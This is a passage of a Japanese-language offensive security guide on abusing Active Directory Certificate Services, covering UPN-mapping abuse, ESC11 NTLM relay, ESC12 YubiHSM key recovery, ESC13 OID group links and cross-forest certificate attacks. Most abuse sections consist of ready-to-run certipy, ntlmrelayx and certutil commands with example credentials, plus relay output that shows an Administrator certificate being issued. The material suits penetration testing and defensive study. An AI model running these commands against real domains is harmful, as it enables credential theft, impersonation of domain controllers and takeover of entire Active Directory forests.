取得した証明書で認証すると、`Administrator@corp.local` の NT ハッシュが得られ、証明書にドメインの詳細が含まれていないため、コマンドでドメインを指定する必要があります。
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### 悪用ケース2

`CertificateMappingMethods` に `UPN` ビットフラグ (`0x4`) が含まれている場合、`GenericWrite` 権限を持つアカウント A は、`userPrincipalName` プロパティを持たないアカウント B（マシンアカウントや組み込みドメイン管理者 `Administrator` を含む）を妨害できます。

ここでは、`GenericWrite` を活用して、`Jane` のハッシュを取得し、`DC$@corp.local` を妨害することを目指します。
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
`Jane`の`userPrincipalName`は`DC$@corp.local`に設定されます。
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
ユーザー`Jane`を使用して、デフォルトの`User`テンプレートを使用してクライアント認証用の証明書がリクエストされます。
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`Jane`の`userPrincipalName`は、このプロセスの後に元に戻ります。
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
Schanelを介して認証するために、Certipyの`-ldap-shell`オプションが利用され、認証成功を`u:CORP\DC$`として示します。
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
LDAPシェルを介して、`set_rbcd`のようなコマンドを使用すると、リソースベースの制約委任（RBCD）攻撃が可能になり、ドメインコントローラーが危険にさらされる可能性があります。
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
この脆弱性は、`userPrincipalName`を持たないユーザーアカウントや、それが`sAMAccountName`と一致しない場合にも拡張されます。デフォルトの`Administrator@corp.local`は、`userPrincipalName`がデフォルトで存在せず、LDAP権限が昇格しているため、主なターゲットとなります。

## ICPRへのNTLM中継 - ESC11

### 説明

CAサーバーが`IF_ENFORCEENCRYPTICERTREQUEST`で構成されていない場合、RPCサービスを介して署名なしでNTLM中継攻撃を行うことができます。[こちらの参照](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/)。

`certipy`を使用して、`Enforce Encryption for Requests`が無効になっているかどうかを列挙し、`certipy`は`ESC11`の脆弱性を表示します。
```bash
$ certipy find -u mane@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
0
CA Name                             : DC01-CA
DNS Name                            : DC01.domain.local
Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
....
Enforce Encryption for Requests     : Disabled
....
[!] Vulnerabilities
ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```
### 悪用シナリオ

中継サーバーを設定する必要があります：
```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
注意: ドメインコントローラーの場合、`-template`をDomainControllerで指定する必要があります。

または、[sploutchyのimpacketのフォーク](https://github.com/sploutchy/impacket)を使用する:
```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```
## ADCS CAへのYubiHSMを使用したシェルアクセス - ESC12

### 説明

管理者は、証明書機関を外部デバイスである「Yubico YubiHSM2」のようなデバイスに保存するように設定できます。

USBデバイスがCAサーバーにUSBポート経由で接続されている場合、またはCAサーバーが仮想マシンの場合はUSBデバイスサーバーがある場合、YubiHSMでキーを生成および利用するために認証キー（「パスワード」とも呼ばれることがあります）が必要です。

このキー/パスワードは、レジストリ内の `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` に平文で保存されています。

参照: [こちら](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).

### 悪用シナリオ

CAの秘密鍵が物理的なUSBデバイスに保存されている場合、シェルアクセスを取得すると鍵を回復することが可能です。

まず、CA証明書（これは公開されている）を取得する必要があります。そして:
```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```
## OID グループリンク悪用 - ESC13

### 説明

`msPKI-Certificate-Policy` 属性を使用すると、証明書テンプレートに発行ポリシーを追加できます。発行ポリシーを担当する `msPKI-Enterprise-Oid` オブジェクトは、PKI OID コンテナの構成名前コンテキスト（CN=OID,CN=Public Key Services,CN=Services）で見つけることができます。このオブジェクトの `msDS-OIDToGroupLink` 属性を使用して、ポリシーを AD グループにリンクさせることができ、ユーザーが証明書を提示した場合にそのユーザーがグループのメンバーであるかのようにシステムを認可させることができます。[こちらの参照](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53)。

言い換えると、ユーザーが証明書を登録する権限を持ち、その証明書が OID グループにリンクされている場合、そのユーザーはこのグループの特権を継承することができます。

OIDToGroupLink を見つけるために [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) を使用してください。
```powershell
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```
### 悪用シナリオ

`certipy find` または `Certify.exe find /showAllPermissions` を使用できるユーザー権限を見つけます。

`John` が `VulnerableTemplate` を登録する権限を持っている場合、ユーザーは `VulnerableGroup` グループの特権を継承できます。

テンプレートを指定するだけで、OIDToGroupLink 権限を持つ証明書を取得できます。
```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```
## 証明書を使用したフォレストの侵害を受動態で説明

### 侵害されたCAによるフォレストトラストの破壊

**クロスフォレストの登録**の構成は比較的簡単に行われます。リソースフォレストからの**ルートCA証明書**は管理者によって**アカウントフォレストに公開**され、リソースフォレストからの**エンタープライズCA**証明書は**各アカウントフォレストの`NTAuthCertificates`およびAIAコンテナに追加**されます。この配置により、リソースフォレストのCAは、PKIを管理する他のすべてのフォレストに対して完全な制御権を持つことができます。このCAが攻撃者によって**侵害**された場合、リソースフォレストとアカウントフォレストのすべてのユーザーの証明書が**偽造**される可能性があり、それによりフォレストのセキュリティ境界が破られます。

### 外部プリンシパルに付与された登録特権

複数のフォレスト環境では、**認証ユーザーまたは外部プリンシパル**（エンタープライズCAが所属するフォレスト外のユーザー/グループ）に**登録および編集権限を許可する証明書テンプレート**を公開するエンタープライズCAに注意が必要です。\
信頼関係を介して認証されると、ADによってユーザーのトークンに**認証ユーザーSID**が追加されます。したがって、ドメインにエンタープライズCAが存在し、**認証ユーザーの登録権限を許可するテンプレート**がある場合、異なるフォレストのユーザーが**テンプレートに登録**する可能性があります。同様に、**外部プリンシパルにテンプレートによって明示的に登録権限が付与されている場合**、**クロスフォレストのアクセス制御関係が作成**され、1つのフォレストのプリンシパルが他のフォレストの**テンプレートに登録**することができます。

両シナリオとも、1つのフォレストから別のフォレストへの**攻撃面の増加**につながります。証明書テンプレートの設定は、攻撃者が外部ドメインで追加の特権を取得するために悪用される可能性があります。
